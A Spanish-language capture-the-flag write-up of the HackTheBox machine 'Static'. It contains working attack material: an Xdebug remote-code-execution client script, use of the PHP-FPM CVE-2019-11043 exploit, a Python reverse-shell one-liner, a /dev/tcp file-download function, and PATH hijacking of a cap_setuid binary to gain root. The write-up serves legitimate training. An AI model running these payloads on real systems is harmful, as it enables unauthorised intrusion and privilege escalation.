---
title: HTB - Static
published: true
categories: [Linux]
tags: [eJPT, eWPT, Difícil]
---


<img src="/assets/HTB/Static/static.png">


¡Hola!
Vamos a resolver de la máquina `Static` de dificultad "Difícil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Compressed File Recomposition (Fixgz)**
- **Abusing TOTP (Python Scripting - NTP protocol)**
- **Playing with Static Routes**
- **XDebug Exploitation (RCE)**
- **Abusing PHP-FPM (RCE) [CVE-2019-11043] (PIVOTING)**
- **Abusing Capabilities (cap_setuid + Path Hijacking - Privilege Escalation)**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Static`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.246
PING 10.10.10.246 (10.10.10.246) 56(84) bytes of data.
64 bytes from 10.10.10.246: icmp_seq=1 ttl=63 time=38.3 ms

--- 10.10.10.246 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.334/38.334/38.334/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```ruby
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.246 -oG allPorts

PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 62
8080/tcp open  http-proxy   syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```ruby
nmap -sCV -p22,2222,8080 10.10.10.246 -oN targeted

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn t have a title (text/html; charset=UTF-8).
| http-robots.txt: 2 disallowed entries 
|_/vpn/ /.ftp_uploads/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Reconocimiento Web

* * *

Si accedemos al servicio http por el puerto 8080 no carga nada. Observamos que es escaneo de nmap ecnontró dos rutas potenciales `/vpn/` y `/.ftp_uploads/`

Accedemos a `/vpn/` y nos ecnontramos ante un panel de login, aplicando guessing averiguamos las credenciales `admin:admin`. Después de introducir las credenciales nos pide una clave `OTP`. El algoritmo de contraseña de un solo uso o TOTP es un algoritmo que permite generar una contraseña de un solo uso que utiliza la hora actual como fuente de singularidad

<img src="/assets/HTB/Static/vpn.png">
<img src="/assets/HTB/Static/otp.png">


Seguimos con el reconocimiento accediendo a `/.ftp_uploads/`. Tenemos capacidad de directory listing, vemos un archivo `db.sql.gz`. Nos lo traemos a nuestro directorio de trabajo para poder examinarlo más detenidamente. Por otro lado vemos un archivo `warning.txt` que si examinamos el contenido nos avisa de que archivos binarios se están corrompiendo durante la transferencia

<img src="/assets/HTB/Static/ftp.png">
<img src="/assets/HTB/Static/corrupt.png">

Al parecer está comprimido en `gzip` pero si tratamos de descomprimirlo parece estar corrupto

```bash
❯ gunzip db.sql.gz

gzip: db.sql.gz: invalid compressed data--crc error

gzip: db.sql.gz: invalid compressed data--length error
```

Probamos a descomprimirlo con `7z`. Dá algún error pero parece que ha descomprimido el archivo `db.sql`

```bash
❯ 7z x db.sql.gz

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD Ryzen 5 3600X 6-Core Processor              (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 262 bytes (1 KiB)

Extracting archive: db.sql.gz
--
Path = db.sql.gz
Type = gzip
Headers Size = 17

ERROR: CRC Failed : db.sql

Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
❯ ll
.rw-r--r-- root  root  363 B Thu Jun 18 17:43:42 2020  db.sql
.rw-r--r-- yorch yorch 262 B Sun Dec 18 16:40:35 2022  db.sql.gz
```
Examinamos el contenido del archivo y parece estar corrompido

```bash
❯ cat db.sql
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: db.sql
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ CREATE DATABASE static;
   2   │ USE static;
   3   │ CREATE TABLE users ( id smallint unsignint  a'n a)Co3 Nto_increment,sers name varchar(20) a'n a)Co, password varchar(40) a'n a)Co, totp varchar(16) a'n a)Co, primary key (idS 
       │ iaA; 
   4   │ INSERT INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma, prim'admin'im'd05nade22ae348aeb5660fc2140aec35850c4da997m'd0orxxi4c7orxwwzlo'
   5   │ IN
   6   │ 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Buscamos en Google y encontramos la herramienta `fixgz` de [yonjar](https://github.com/yonjar/fixgz). La clonamos en nuestro directorio de trabajo, la compilamos y ejecutamos según instrucciones

```bash
❯ gcc fixgz.cpp -o fixgz
❯ ll
.rwxr-xr-x root root  20 KB Sun Dec 18 17:09:59 2022  fixgz
.rwxr-xr-x root root 1.4 KB Sun Dec 18 17:08:15 2022  fixgz.cpp
.rw-r--r-- root root  22 KB Sun Dec 18 17:08:15 2022  fixgz.exe
.rw-r--r-- root root 135 B  Sun Dec 18 17:08:15 2022  README.md
❯ ./fixgz ../db.sql.gz ../fixed.sql.gz
```

Descomprimimos el archivo `fixed.sql.gz` y esta vez podemos acceder al archivo

```bash
❯ gunzip fixed.sql.gz
❯ ll
drwxr-xr-x root  root   72 B Sun Dec 18 17:09:59 2022  fixgz
.rw-r--r-- yorch yorch 262 B Sun Dec 18 16:40:35 2022  db.sql.gz
.rw-r--r-- root  root  355 B Sun Dec 18 17:10:27 2022  fixed.sql
❯ cat fixed.sql
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: fixed.sql
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ CREATE DATABASE static;
   2   │ USE static;
   3   │ CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) );
       │  
   4   │ INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
   5   │ 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Tenemos credenciales de `admin`. Con la herramienta web [CrackStation](https://crackstation.net/) procedemos a crackear la contraseña. Confirmamos qu es la password encontrada anteriormente por guessing. Entendemos que el tercer valor de las credenciales obtenidas del archivo sql es la clave OTP, a pesar de ello la introducimos y no nos loguea. Debido a la diferencia de hora entre nuestro equipo y la máquina víctima la clave OTP no funciona correctamente

Si realizamos un escaneo de puertos por UDP localizamos el puerto `123/udp open  ntp` abierto. `NTP` (Network Time Protocol) es un protocolo de Internet para sincronizar los relojes de los sistemas informáticos a través del enrutamiento de paquetes en redes con latencia variable. NTP utiliza UDP como su capa de transporte, usando el puerto 123

```bash
❯ nmap -sU --top-ports 500 --open -T5 -v -n 10.10.10.246 -oN ../nmap/udpScan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-18 17:27 CET
Initiating Ping Scan at 17:27
Scanning 10.10.10.246 [4 ports]
Completed Ping Scan at 17:27, 0.07s elapsed (1 total hosts)
Initiating UDP Scan at 17:27
Scanning 10.10.10.246 [500 ports]
Discovered open port 123/udp on 10.10.10.246
Completed UDP Scan at 17:28, 19.50s elapsed (500 total ports)
Nmap scan report for 10.10.10.246
Host is up (0.047s latency).
Not shown: 499 open|filtered udp ports (no-response)
PORT    STATE SERVICE
123/udp open  ntp

❯ nmap -sU -sCV -p123 10.10.10.246
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-18 17:31 CET
Nmap scan report for 10.10.10.246
Host is up (0.044s latency).

PORT    STATE SERVICE VERSION
123/udp open  ntp     NTP v4 (unsynchronized)
| ntp-info: 
|_  

Host script results:
|_clock-skew: 5s
```
Crearemos un script en python el cual nos generará una clave OTP sincronizando las horas de la máquina víctima con la nuestra

```python
import pyotp
import ntplib
from time import ctime

client = ntplib.NTPClient()
response = client.request("10.10.10.246")
totp = pyotp.TOTP("orxxi4c7orxwwzlo")

print("EL TOKEN es -> %s" % totp.at(response.tx_time))
```
Ejecutamos el script y obetenemos clave OTP válida. Accedemos al servicio vpn mostrado anteriormente

```bash
❯ python3 getToken.py
EL TOKEN es -> 265088
```

<img src="/assets/HTB/Static/access.png">

Observamos unas IPs que están fuera de nuestro rango. Introducimos `test` en el input y nos descarga un archivo `test.ovp`. Tratamos de conectarnos a la vpn pero nos da error. Examinado su contenido encontramos dominio `vpn.static.htb`, agregamos a `/etc/hosts`

<img src="/assets/HTB/Static/testovpn.png">

Nos conectamos a la VPN y nos asignan un nuevo interfaz de red `tun9`. Por la Ip que tenemos asiganada vemos que estamos dentro del mismo segmento que la IP mostrada en la web `vpn 172.30.0.1` 

<img src="/assets/HTB/Static/redvpn.png">

Seguimos escaneando los puertos abiertos de `172.30.0.1`. Localizamos puertos 22 y 2222 abiertos

```bash
❯ nmap -sS --min-rate 5000 --open -n -Pn -p- 172.30.0.1
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-18 18:05 CET
Nmap scan report for 172.30.0.1
Host is up (0.045s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1
```

Nuestra IP está en el rango 127.30.0.0/24, en la web vemos dos IPs que están en el rango 172.20.0.0/24. Agregaremos una ruta estática para poder tener alcance a este segmento. Mediante la herramienta `ping` confirmamos que tenemos conectividad con el segmento 172.20.0.0/24

```bash
❯ ip route add 172.20.0.0/24 dev tun9
❯ ip route list
default via 192.168.1.1 dev ens33 proto dhcp src 192.168.1.148 metric 100 
10.10.10.0/23 via 10.10.14.1 dev tun0 
10.10.14.0/23 dev tun0 proto kernel scope link src 10.10.14.34 
10.129.0.0/16 via 10.10.14.1 dev tun0 
172.17.0.0/24 via 172.30.0.1 dev tun9 
172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
172.20.0.0/24 dev tun9 scope link 
172.30.0.0/16 dev tun9 proto kernel scope link src 172.30.0.9 
192.168.1.0/24 dev ens33 proto kernel scope link src 192.168.1.148 metric 100

❯ ping -c 1 172.20.0.11
PING 172.20.0.11 (172.20.0.11) 56(84) bytes of data.
64 bytes from 172.20.0.11: icmp_seq=1 ttl=63 time=38.8 ms

--- 172.20.0.11 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.813/38.813/38.813/0.000 ms
```

Seguimos escaneando puertos y servicios de `web	172.20.0.10`

```bash
❯ nmap -sS --min-rate 5000 --open -n -Pn -p- 172.20.0.10
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-18 18:25 CET
Nmap scan report for 172.20.0.10
Host is up (0.042s latency).
Not shown: 65522 closed tcp ports (reset), 11 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Detectamos un servicio HTTP en el puerto 80. Accedemos y observamos un archivo `info.php`

<img src="/assets/HTB/Static/webvpn.png">

Examinando el archivo `info.php` obsrevamos que tiene la extensión `Xdebug`. Xdebug es una extensión de PHP que proporciona la capacidad de depuración código y errores.​ Buscando por vulnerabilidades asociadas a esta extensión encontramos el repositorio de GitHub de [nqxcode](https://github.com/nqxcode/xdebug-exploit). Nos lo clonamos en nuestro directorio de trabajo

<img src="/assets/HTB/Static/xdebug.png">

Ejecutamos script con python2 y la herramienta se pone en escucha en el puerto 9000. Siguiendo las instrucciones del repositorio hacemos un curl a la dirección web pasando por parámetro la cabecera `Cookie` y tenemos capacidad de inyectar comandos en PHP

<img src="/assets/HTB/Static/exploitgithub.png">

Como vimos en el archivo info.php la función `system` no está deshabilitada. Ejecutamos `whoami`. La respuesta viene en base64, decodificamos para obetener texto claro

<img src="/assets/HTB/Static/rce.png">

para ganar en agilidad a la hora de ejecutar comandos vamos a modificar el script en python2 del repositorio de GitHub

```python
#!/usr/bin/env python2

import  socket, pdb, signal, sys, re
from base64 import b64decode

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

ip_port = ('0.0.0.0', 9000) 
sk = socket.socket()
sk.bind(ip_port) 
sk.listen(10) 
conn, addr = sk.accept() 

while  True: 
    client_data = conn.recv(1024) 
    
    response_b64 = re.findall(r'CDATA\[(.*?)\]', client_data)[0]

    try:
        output = b64decode(response_b64)
        print(output)
    except:
        None

    data = raw_input ('>> ') 
    conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
```

De esta forma el propio script nos descodifica automáticamente el output del comando insertado

```bash
❯ python2 exploit_shell.py
>> system("whoami")
www-data
```

Enumerando el archivo `/etc/psswd` nos percatamos que el usuario `www-data` tiene directorio personal en `/home`

```bash
>> system("grep www-data /etc/passwd")
www-data:x:33:33:www-data:/home/www-data:/bin/bash
```

Listando contenido del directorio home de www-data tenemos capacidad de listar contenido del directorio `/home/www-data/.ssh` y encontramos una clave privada `id_rsa`. Sólo hay un pequeño problema y es que sólo nos lista una única línea, en este caso vemos la última línea del archivo id_rsa

```bash
>> system("cat /home/www-data/.ssh/id_rsa")           
-----END RSA PRIVATE KEY-----
```

Mediante filtrado con comandos en bash exatremos línea a línea y nos importamos la clave id_rsa a nuestro equipo. Tratamos de conectarnos y nos pide contraseña, pero recordemos que tenemos el puerto 2222 con el servicio open ssh disponible. Nos conectamos sin problema al puerto 2222. la flag de usuario de bajos privilegios la localizamos en el directorio `/home`

```bash
❯ ssh -i id_rsa www-data@10.10.10.246
www-data@10.10.10.246 s password: 

❯ ssh -i id_rsa www-data@10.10.10.246 -p 2222
The authenticity of host '[10.10.10.246]:2222 ([10.10.10.246]:2222)' can t be established.
ECDSA key fingerprint is SHA256:SO5uMKk4fPWk/kDc0dLD5Uf7dlyIes4r6s26waZlxkQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.246]:2222' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Jun 14 08:00:30 2021 from 10.10.14.4
www-data@web:~$ whoami
www-data
www-data@web:/home$ cat user.txt 
0b5dcbfc091785dad***************
```

### Movimiento Lateral

* * *

Si examinamos las interfaces de red observamos que existen dos interfaces de red con sus respectivos segmentos.

```bash
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.20.0.10  netmask 255.255.255.0  broadcast 172.20.0.255
        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)
        RX packets 68036  bytes 3984803 (3.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 67861  bytes 3875490 (3.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255
        ether 02:42:c0:a8:fe:02  txqueuelen 0  (Ethernet)
        RX packets 36  bytes 11198 (11.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 810 (810.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Recordemos cuando ganamos acceso a la red había una IP `192.168.254.3` con el identificador `pki`

Lanzamos ping para comprobar que tengamos acceso a este segmento

```bash
www-data@web:/home$ ping -c 1 192.168.254.3
PING 192.168.254.3 (192.168.254.3) 56(84) bytes of data.
64 bytes from 192.168.254.3: icmp_seq=1 ttl=64 time=0.135 ms

--- 192.168.254.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.135/0.135/0.135/0.000 ms
```

Mediante la herramienta `wget` verificamos por si hubiera algún contenido alojado en el puerto 80

```bash
www-data@web:/home$ wget -qO- http://192.168.254.3
batch mode: /usr/bin/ersatool create|print|revoke CN
```

Con `ssh` nos volvemos a conectar pero esta vez aplicando remote port forwarding para traernos el puerto 80 a nuestro equipo. Accedemos en el navegador a `localhost` y observamos el contenido mostrado por la herramienta `wget`

```bash
❯ ssh -i id_rsa www-data@10.10.10.246 -p 2222 -L 80:192.168.254.3:80
```

<img src="/assets/HTB/Static/localhost.png">

Con la herramienta `curl` listamos las cabeceras y obtenemos versión de `PHP-FPM/7.1`

```bash
❯ curl -s -X GET "http://localhost" -I
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 18 Dec 2022 18:41:26 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP-FPM/7.1
```

Buscamos en Google por vulnerabilidades asociadas a esta versión de PHP y encontramos el repositorio de GitHub de [theMiddleBlue](https://github.com/theMiddleBlue/CVE-2019-11043)

Ejecutamos exploit y obsrevamos output

```bash
python3 exploit.py --url http://localhost/index.php --verbose
.
.
.
[*] Target seems vulnerable (QSL:1754/HVL:224): PHPSESSID=d67d4eccf2e9f3fdec8cadd6e8260261; path=/
.
.
.
[*] RCE successfully exploited!

    You should be able to run commands using:
    curl http://localhost/index.php?a=bin/ls+/
```

Accedemos a la url presentada por el exploit y logramos listar los archivos y directorios de la máquina. Tenemos `RCE` en la máquina `pki`

<img src="/assets/HTB/Static/ls.png">

Recordemos que en la máquina `pki` tenemos acceso al segmento 192.168.0.0/24. Directamente no tenemos conectividad con nuestra máquina de atacante por lo que primero debemos entablar una reverse shell con la máquina `web`. Primero debemos subir un binario de netcat compilado ya que no dispone de esta herramienta

```bash
❯ scp -P 2222 -i id_rsa nc www-data@10.10.10.246:/tmp/nc
```

Nos ponemos en escucha en el puerto 4646 en la máquina `web` y ejecutamos curl junto oneliner en python

```bash
curl -s -G -X GET "http://localhost/index.php" --data-urlencode "a=/usr/bin/python3.6 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.254.2\",4646));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | awk "/' - /,/: cannot open/" | sed "s/' - //" | grep -v cannot
```

```bash
www-data@web:/tmp$ ./nc -nlvp 4646
Connection from 192.168.254.3:41876
/bin/sh: 0: can't access tty; job control turned off
$ www-data
$ whoami
www-data
$ hostname 
pki
```

### Escalada Privilegios

* * *

Listamos contenido de la carpeta que hemos accedido y vemos un `index.php`, listamos su contenido. Vemos un binario `ersatool`, listando capabilities vemos que tiene `cap_setuid+eip`

```bash
www-data@pki:~/html$ ls -l
total 8
-rw-r--r-- 1 root     root      174 Apr  4  2020 index.php
drwxr-xr-x 2 www-data www-data 4096 Sep 20 14:30 uploads
www-data@pki:~/html$ cat index.php 
<?php
header('X-Powered-By: PHP-FPM/7.1');
//cn needs to be parsed!!!
$cn=preg_replace("/[^A-Za-z0-9 ]/", '',$_GET['cn']);
echo passthru("/usr/bin/ersatool create ".$cn);
?>
www-data@pki:~/html$ ls -l /usr/bin/ersatool
-rwxr-xr-x 1 root root 22496 Jun 21  2021 /usr/bin/ersatool
www-data@pki:~/html$ getcap /usr/bin/ersatool
/usr/bin/ersatool = cap_setuid+eip
```

Nos decargamos la herramienta `pspy`. Primero debemos subirla a la máquina `web` y de ahí mediante un curl en bash la subimos a la máquina `pki`

```bash
#MAQUINA ATACANTE
❯ scp -P 2222 -i id_rsa pspy64 www-data@10.10.10.246:/tmp/pspy
```

```bash
#MAQUINA WEB
www-data@web:/tmp$ ls
nc  pspy  xdebug.log
www-data@web:/tmp$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```bash
#MAQUINA PKI
www-data@pki:/tmp$ function __curl() {
>   read proto server path <<<$(echo ${1//// })
>   DOC=/${path// //}
>   HOST=${server//:*}
>   PORT=${server//*:}
>   [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
> 
>   exec 3<>/dev/tcp/${HOST}/$PORT
>   echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
>   (while read line; do
>    [[ "$line" == $'\r' ]] && break
>   done && cat) <&3
>   exec 3>&-
> }
www-data@pki:/tmp$ __curl http://192.168.254.2:8080/pspy > pspy
www-data@pki:/tmp$ file pspy
pspy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
```

Ejecutamos la herramienta `pspy` y ganando acceso a una nueva consola en la máquina `pki` ejecutamos el binario `ersatool` para examinar el output en pspy

```bash
www-data@pki:/tmp$ ./pspy 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
.
.
.
2022/12/18 20:05:21 CMD: UID=0    PID=2069   | ersatool 
2022/12/18 20:05:21 CMD: UID=0    PID=2071   | /bin/sh /opt/easyrsa/easyrsa build-client-full test nopass batch 
2022/12/18 20:05:21 CMD: UID=0    PID=2072   | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`ChangeMe`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf 
2022/12/18 20:05:21 CMD: UID=0    PID=2073   | openssl version 
2022/12/18 20:05:21 CMD: UID=0    PID=2074   | openssl version 
2022/12/18 20:05:21 CMD: UID=0    PID=2075   | rm /opt/easyrsa/pki/extensions.temp
```

Observamos que la aplicación `ersatool` ejecuta una serie de instrucciones algunas de ellas haciendo referencia a openssl. Mediante `Path Hijacking` nos crearemos nuestra aplicación maliciosa `openssl` la cual aplicará permisos SUID a la bash

```bash
www-data@pki:/tmp$ echo -e '#!/bin/bash\nchmod u+s /bin/bash' > openssl
#!/bin/bash
chmod u+s /bin/bash
www-data@pki:/tmp$ export PATH=/tmp/:$PATH
```

Ejecutamos nuevamente la aplicación ersatool y asignamos privilegios SUID a la bash. Con `bash -p` ganamos acceso privilegiado a l máquina víctima. la flag de root la tenemos en el directorio de `/root`

```bash
www-data@pki:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
www-data@pki:/tmp$ bash -p
bash-4.4# cat /root/root.txt 
0aa40d05f67137938***************
```

Hemos completado la máquina **Static** de HackTheBox!! Happy Hacking!!

<img src="/assets/HTB/Static/pwned.png">